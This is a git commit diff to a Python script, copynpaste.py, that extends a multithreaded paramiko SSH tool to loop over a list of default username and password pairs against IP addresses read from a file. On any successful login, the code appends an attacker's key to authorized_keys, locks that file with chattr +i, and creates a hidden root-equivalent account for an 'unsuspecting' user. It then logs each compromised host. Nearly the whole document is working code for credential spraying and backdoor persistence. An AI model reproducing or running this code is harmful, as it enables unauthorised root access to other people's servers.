e7144a2d3a4ca4a6d313ee7e4ead597fa6aa63d7
Gabriel Massadas <G4brym@users.noreply.github.com>
2017-10-24 17:46:52 +0100

    Multiple tries with multiple username and passwords

--- copynpaste.py
+++ copynpaste.py
@@ -7,59 +7,49 @@ import select
 import threading
 
 port = 22
-username1 = "<default username>"
-password1 = "<default password>"
-username2 = "<default username>"
-password2 = "<default password>"
+logins = [
+	{"username": "<default username1>", "password": "<default password1>"},	
+	{"username": "<default username2>", "password": "<default password2>"},	
+	{"username": "<default username3>", "password": "<default password3>"},	
+	{"username": "<default username4>", "password": "<default password4>"}	
+]
 key = 'ssh-rsa <enter your key here>'
 outlock = threading.Lock()
 
 def workon(host):
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.load_system_host_keys()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        print ("Connecting to %s" % host)
-        ssh.connect(host, port, username1, password1)
-        stdin, stdout, stderr = ssh.exec_command("sudo echo '%s' >> ~/.ssh/authorized_keys \n sudo chattr +i ~/.ssh/authorized_keys \n sudo useradd -ou 0 -g 0 <Enter unsuspecting Username> \n sudo echo '<Enter Password>' | passwd <Enter unsuspecting Username> --stdin" % key)
-        with outlock:
-            print ("Connected to %s" % host)
-            os.system('echo "%s" >> successful' % host)
-            print (stdout.readlines())
-            sys.exit()
-        sys.exit()
-    except paramiko.AuthenticationException:
-        print ("Authentication failed when connecting to host %s" %(host))
-        print ("Trying again for %s" % host)
-        try:
-            ssh.connect(host, port, username2, password2)
-            with outlock:
-                print ("Connected to %s" % host)
-                os.system('echo "%s" >> successful' % host)
-                print (stdout.readlines())
-                sys.exit()
-            sys.exit()
-        except paramiko.AuthenticationException:
-            print ("Final try to %s failed" % host)
-            os.system('echo "%s" >> failed' % host)
-            sys.exit()
-        except Exception:
-            pass
-            sys.exit()
-    except Exception:
-        print ("Port not opened or unreachable for %s" % host)
-        os.system('echo "%s" >> failed' % host)
-        pass
-        sys.exit()
+	try:
+		for loginInfo in logins:
+			try:
+				ssh = paramiko.SSHClient()
+				ssh.load_system_host_keys()
+				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+				print ("Connecting to %s" % host)
+				ssh.connect(host, port, loginInfo["username"], loginInfo["password"])
+				stdin, stdout, stderr = ssh.exec_command("sudo echo '%s' >> ~/.ssh/authorized_keys \n sudo chattr +i ~/.ssh/authorized_keys \n sudo useradd -ou 0 -g 0 <Enter unsuspecting Username> \n sudo echo '<Enter Password>' | passwd <Enter unsuspecting Username> --stdin" % key)
+				with outlock:
+					print ("Connected to %s" % host)
+					os.system('echo "%s" >> successful' % host)
+					print (stdout.readlines())
+					sys.exit()
+				sys.exit()
+			except paramiko.AuthenticationException:
+				print ("Authentication failed when connecting to host %s" %(host))
+				print ("Trying again for %s" % host)
+				pass
+	except Exception:
+		print ("Port not opened or unreachable for %s" % host)
+		os.system('echo "%s" >> failed' % host)
+		pass
+		sys.exit()
 def main():
-    threads = []
-    for h in open ('serveripaddr.txt'):
-        h = h.rstrip()
-        t = threading.Thread(target=workon, args=(h,))
-        t.start()
-        threads.append(t)
-    for t in threads:
-        t.join()
+	threads = []
+	for h in open ('serveripaddr.txt'):
+		h = h.rstrip()
+		t = threading.Thread(target=workon, args=(h,))
+		t.start()
+		threads.append(t)
+	for t in threads:
+		t.join()
 
 if __name__ == "__main__":
-    main()
+	main()
